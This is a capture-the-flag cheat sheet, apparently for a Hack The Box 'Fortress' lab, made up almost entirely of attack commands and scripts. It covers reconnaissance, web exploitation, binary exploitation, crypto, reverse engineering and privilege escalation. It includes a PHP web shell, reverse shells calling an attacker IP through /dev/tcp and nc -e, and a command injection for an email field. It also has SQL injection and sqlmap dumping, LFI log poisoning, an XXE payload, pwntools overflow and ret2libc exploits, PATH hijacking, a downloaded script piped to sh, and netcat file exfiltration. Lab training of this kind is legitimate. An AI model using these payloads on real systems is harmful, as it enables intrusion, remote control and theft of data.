## Phase 1 - Reconnaissance

### Initial Scan

```bash
# Full aggressive scan
nmap -sV -sC -Pn -n -T4 -p- 10.13.37.10 --open -oA scan_full

# Quick top ports
nmap -sV -sC -T5 --top-ports 1000 10.13.37.10 -oN scan_quick

# UDP scan (DNS, SNMP)
nmap -sU -T4 --top-ports 100 10.13.37.10
```

### DNS - Key Step in Fortress

```bash
# Reverse DNS lookup (often flag 1)
dig @10.13.37.10 -x 10.13.37.10

# Zone transfer
dig axfr @10.13.37.10 domain.htb

# Domain enumeration
dig any domain.htb @10.13.37.10
nslookup -type=any domain.htb 10.13.37.10

# Subdomain fuzzing
gobuster dns -d domain.htb -r 10.13.37.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Add discovered domain
echo "10.13.37.10 domain.htb" >> /etc/hosts
```

### Specific Service Scan

```bash
# HTTP recon
curl -v http://10.13.37.10/
curl -s http://domain.htb | grep -iE 'flag|HTB{|href|src'

# HTTPS with cert inspection
curl -k -v https://domain.htb 2>&1 | grep -E 'subject|issuer|flag'

# Quick source code flag search
curl -s http://domain.htb | grep -oE 'HTB\{[^}]+\}'
```

## Phase 2 - Web Exploitation

### Web Enumeration

```bash
# Directories
gobuster dir -u http://domain.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,js,bak -t 50 -o gobuster.txt

feroxbuster -u http://domain.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --ext php,html,txt -t 100

# Hidden files
ffuf -u http://domain.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -fc 404

# Vhosts
ffuf -u http://10.13.37.10 -H "Host: FUZZ.domain.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 404,302
```

### Source Code Analysis

```bash
# Obfuscated JS - deobfuscation
curl -s http://domain.htb/script.js | python3 -m jsbeautifier

# Hidden links in JS
curl -s http://domain.htb/ | grep -Eo '(src|href)="[^"]*"'
curl -s http://domain.htb/app.js | grep -Eo '"\/[a-zA-Z0-9/_-]+"' | sort -u

# HTML comments
curl -s http://domain.htb/ | grep -E '<!--.*-->'
```

### SQL Injection

```bash
# Manual test
' OR 1=1--
' OR '1'='1
admin'--
" OR "1"="1

# Capture + sqlmap
# 1. Burp -> Save request -> request.txt
sqlmap -r request.txt --level=5 --risk=3 --batch
sqlmap -r request.txt --dbs
sqlmap -r request.txt -D dbname --tables
sqlmap -r request.txt -D dbname -T users --dump

# Direct POST
sqlmap -u "http://domain.htb/login" --data="user=admin&pass=test" --level=3 --batch --dbs

# WAF bypass
sqlmap -r request.txt --tamper=space2comment,between --batch

# Manual union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,NULL FROM users--
```

### File Upload / RCE

```bash
# Basic PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Extension bypass
mv shell.php shell.php.jpg
mv shell.php shell.phtml
mv shell.php shell.php5

# Upload + test
curl "http://domain.htb/uploads/shell.php?cmd=id"
curl "http://domain.htb/uploads/shell.php?cmd=cat+/etc/passwd"

# Reverse shell via webshell
curl "http://domain.htb/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'"

# Listener
nc -lvnp 4444
```

### LFI / Path Traversal

```bash
# Basic
curl "http://domain.htb/page?file=../../../../etc/passwd"
curl "http://domain.htb/page?file=/etc/passwd"

# Filter bypass
curl "http://domain.htb/page?file=....//....//etc/passwd"
curl "http://domain.htb/page?file=..%2F..%2F..%2Fetc%2Fpasswd"

# Log poisoning to RCE
curl -A "<?php system(\$_GET['cmd']); ?>" http://domain.htb/
curl "http://domain.htb/page?file=/var/log/apache2/access.log&cmd=id"

# PHP wrappers
curl "http://domain.htb/page?file=php://filter/convert.base64-encode/resource=/etc/passwd"
# Decode the output
echo "cm9vd..." | base64 -d
```

### SSRF / XXE

```bash
# SSRF
curl "http://domain.htb/fetch?url=http://127.0.0.1:8080/"
curl "http://domain.htb/fetch?url=file:///etc/passwd"

# XXE
curl -X POST http://domain.htb/api -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>' -H "Content-Type: application/xml"
```

### Email / SMTP - Command Injection

```bash
# Test injection in email field (Fortress JET)
test@test.com; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 #
test@test.com | nc 10.10.14.5 4444 -e /bin/bash

# With Burp: intercept the request, modify the email field
```

## Phase 3 - Binary Exploitation / Pwn

### Static Binary Analysis

```bash
# General info
file binary
checksec binary

# Protection summary
checksec --file=binary
# NX (No eXecute), ASLR, PIE, Canary, RELRO

# Useful strings
strings binary | grep -iE 'flag|pass|key|secret|admin|HTB'
strings -n 8 binary

# Quick disassembly
objdump -d binary | less
objdump -d binary | grep -A5 "<main>"
readelf -a binary
```

### GDB / pwndbg / peda

```bash
gdb -q ./binary
gdb-pwndbg ./binary

# Essential GDB commands
(gdb) info functions        # list functions
(gdb) disas main            # disassemble main
(gdb) break main            # breakpoint
(gdb) run                   # execute
(gdb) run $(python3 -c "print('A'*200)")
(gdb) info registers        # registers
(gdb) x/20x $rsp            # examine stack
(gdb) x/s $rax              # string at rax address
```

### Buffer Overflow - Stack

```bash
# 1. Find the offset (cyclic pattern)
python3 -c "from pwn import *; print(cyclic(200).decode())"
# Or with pwndbg: cyclic 200

# Launch binary with pattern, note crash address
# Calculate offset:
python3 -c "from pwn import *; print(cyclic_find(0x61616174))"  # RBP/RSP value

# 2. Confirm offset
python3 -c "print('A'*offset + 'B'*8)" | ./binary

# 3. Basic exploit (no protections)
python3 -c "
from pwn import *
p = process('./binary')
offset = 72
payload = b'A' * offset
payload += p64(0x401234)  # win function address
p.sendline(payload)
p.interactive()
"
```

### Bypass ASLR / PIE

```bash
# Check system ASLR
cat /proc/sys/kernel/randomize_va_space   # 0=off, 2=full

# Leak address via format string or printf
python3 -c "print('%p.'*20)" | ./binary   # leak stack addresses

# ret2libc (NX enabled, no PIE)
python3 -c "
from pwn import *
elf = ELF('./binary')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find ROP gadgets
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

offset = 72
payload = flat(b'A' * offset, pop_rdi, puts_got, puts_plt, main)
"

# Find ROP gadgets
ROPgadget --binary binary | grep "pop rdi"
ropper -f binary --search "pop rdi"
```

### Format String

```bash
# Leak memory
echo "%p.%p.%p.%p.%p" | ./binary
echo "%7\$p" | ./binary         # 7th stack argument

# Read specific address
python3 -c "from pwn import *; p = process('./binary'); p.sendline(p64(0x601050) + b'%6\$s'); print(p.recv())"

# Write to memory
python3 -c "from pwn import *; p = process('./binary'); p.sendline(b'%100c%7\$n')"
```

### Heap Exploitation

```bash
# Check tcache/fastbin
python3 -c "
from pwn import *
# Use after free
p = process('./binary')
p.sendlineafter('>', '1')   # malloc
p.sendlineafter('>', '3')   # free
p.sendlineafter('>', '4')   # use after free -> overwrite
"
```

## Phase 4 - Cryptography

### Quick Identification

```bash
# Identify the type
python3 -c "import base64; print(base64.b64decode('...'))"
echo "..." | xxd | head
file cipher.bin
```

### XOR

```bash
# XOR with known key
python3 -c "
data = bytes.fromhex('deadbeef...')
key = b'KEY'
out = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
print(out)
"

# XOR brute force (1 byte key)
python3 -c "
data = bytes.fromhex('...')
for k in range(256):
    out = bytes([b ^ k for b in data])
    if b'HTB{' in out or b'flag' in out.lower():
        print(f'Key={k}: {out}')
"

# XOR known plaintext attack (stream cipher reuse)
python3 -c "
ct1 = bytes.fromhex('...')
ct2 = bytes.fromhex('...')
known = b'HTB{'
keystream = bytes([ct1[i] ^ known[i] for i in range(len(known))])
print(keystream)
"
```

### ROT / Caesar

```bash
# ROT13
echo "Zvpebfbsg" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Caesar brute force
python3 -c "
s = 'encrypted_text'
for shift in range(26):
    print(shift, ''.join(chr((ord(c)-65+shift)%26+65) if c.isupper() else chr((ord(c)-97+shift)%26+97) if c.islower() else c for c in s))
"
```

### RSA

```bash
# Factorize small n
python3 -c "
from sympy import factorint
n = 123456789...
print(factorint(n))
"

# RSA decrypt with p, q, e
python3 -c "
from Crypto.Util.number import inverse, long_to_bytes
p, q, e = ..., ..., 65537
n = p * q
phi = (p-1)*(q-1)
d = inverse(e, phi)
c = ...
m = pow(c, d, n)
print(long_to_bytes(m))
"

# RsaCTFTool
python3 RsaCTFTool.py --publickey key.pem --uncipherfile cipher.txt
python3 RsaCTFTool.py -n N -e e --uncipher c
```

### Common Encodings

```bash
# Base64
echo "SGVsbG8=" | base64 -d
cat file | base64 -d

# Hex
echo "48544237" | xxd -r -p
python3 -c "print(bytes.fromhex('48544237'))"

# Binary to ASCII
python3 -c "print(''.join([chr(int(b,2)) for b in '01001000 01010100 01000010'.split()]))"
```

## Phase 5 - Reverse Engineering

### Static Analysis

```bash
# Ghidra (GUI) - decompilation
ghidra &
# Import binary -> Double-click main -> analyze

# Radare2
r2 -A binary
[0x00400...]> afl         # list functions
[0x00400...]> s main; pdf # disassemble main
[0x00400...]> iz           # strings
[0x00400...]> iI           # binary info

# Objdump
objdump -d -M intel binary | grep -A50 "<main>"

# ltrace / strace (dynamic)
ltrace ./binary           # library calls (strcmp, strncmp, etc.)
strace ./binary           # syscalls
```

### Identifying Flag Comparisons

```bash
# ltrace to see strcmp in cleartext
ltrace ./binary <<< "test_input"
ltrace ./binary 2>&1 | grep -E 'strcmp|strncmp|memcmp'

# Patching the binary (inverting a jump)
# In Ghidra: Right-click instruction -> Patch instruction
# JNE -> JE, or JZ -> JNZ

# GDB: modify flags
(gdb) set $eflags |= (1 << 6)   # enable ZF (zero flag)
(gdb) jump *0x401234             # jump to address
```

### Malware / Shellcode Analysis

```bash
# Extract shellcode
objdump -d binary | grep -Po '\\x[0-9a-f]{2}' | tr -d '\n'

# Execute shellcode in sandbox
python3 -c "
import ctypes
sc = b'\x90\x90...\xc3'
buf = ctypes.create_string_buffer(sc)
func = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_int))
func()
"
```

## Phase 6 - Privilege Escalation

### Linux PrivEsc (Post Reverse Shell)

```bash
# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z -> stty raw -echo; fg

# Quick enumeration
id && whoami && hostname
sudo -l                    # sudo commands
find / -perm -u=s 2>/dev/null    # SUID
getcap -r / 2>/dev/null         # capabilities

# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Files containing passwords
grep -rn "password\|passwd\|secret" /var/www/ /etc/ /home/ 2>/dev/null | grep -v Binary

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

### SUID Exploitation

```bash
# Identify SUID
find / -perm -u=s -type f 2>/dev/null | xargs ls -la

# Exploit SUID with buffer overflow
file ./suid_binary
checksec ./suid_binary
gdb -q ./suid_binary

# PATH hijacking if possible
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
./suid_binary    # if it calls 'ls' without absolute path
```

### Heap/Binary Local PrivEsc

```bash
# BOF with ASLR disabled
cat /proc/sys/kernel/randomize_va_space

# ret2libc for SUID
python3 -c "
from pwn import *
context.arch = 'amd64'
elf = ELF('/path/to/suid_binary')
# ... see Phase 3
" > exploit.py
python3 exploit.py
```

## Phase 7 - Tools and Fortress Workflow

### Recommended Fortress Workflow

```text
1. nmap -> discover all ports
2. dig -x -> reverse DNS -> domain.htb -> /etc/hosts -> FLAG 1
3. curl source code -> hidden links, comments -> FLAG 2
4. gobuster -> hidden directories -> FLAG in login source
5. SQLmap on login -> hash -> john -> credentials
6. Login -> functionality (email, upload) -> RCE -> reverse shell
7. find / -perm -u=s -> SUID binary -> GDB -> BOF -> root
8. XOR/Crypto -> decrypt data -> CRYPTO FLAGS
```

### Useful Fortress One-Liners

```bash
# Search for all flags once you have a shell
grep -r "HTB{" / 2>/dev/null
find / -name "flag*" -o -name "*.flag" 2>/dev/null
find / -readable -type f 2>/dev/null | xargs grep -l "HTB{" 2>/dev/null

# Quick hash cracking
echo "hash_value" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt # SHA256
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt # sha512crypt

# Identify hash type
hash-identifier hash_value
python3 -c "import hashid; h = hashid.HashID(); print(h.identifyHash('hash_value'))"

# Deobfuscate JS with jsnice
curl -s http://domain.htb/app.js -o app.js
node --eval "$(cat app.js)" 2>&1 | head -50

# File transfer
# From victim to attacker
python3 -m http.server 8080        # on attacker
wget http://10.10.14.5:8080/linpeas.sh

# From attacker to victim
curl http://10.10.14.5:8080/exploit -o /tmp/exploit
chmod +x /tmp/exploit

# Netcat file transfer
nc -lvnp 9999 > received_file          # attacker
nc 10.10.14.5 9999 < /path/to/file     # victim
```

### Essential Tools

```text
Tool          | Phase   | Usage
nmap          | Recon   | Port/service scanning
gobuster/ffuf | Web     | Dir/vhost fuzzing
sqlmap        | Web     | Automated SQL injection
Burp Suite    | Web     | Intercept/modify requests
pwndbg/gdb    | Pwn     | Binary debugging
pwntools      | Pwn     | Exploit scripting
ROPgadget     | Pwn     | Find ROP gadgets
Ghidra/r2     | Rev     | Decompilation
ltrace/strace | Rev     | Dynamic call tracing
john/hashcat  | Crypto  | Hash cracking
RsaCTFTool    | Crypto  | RSA attacks
CyberChef     | Crypto  | Multi-format decoding
linpeas       | PrivEsc | Linux enumeration
```
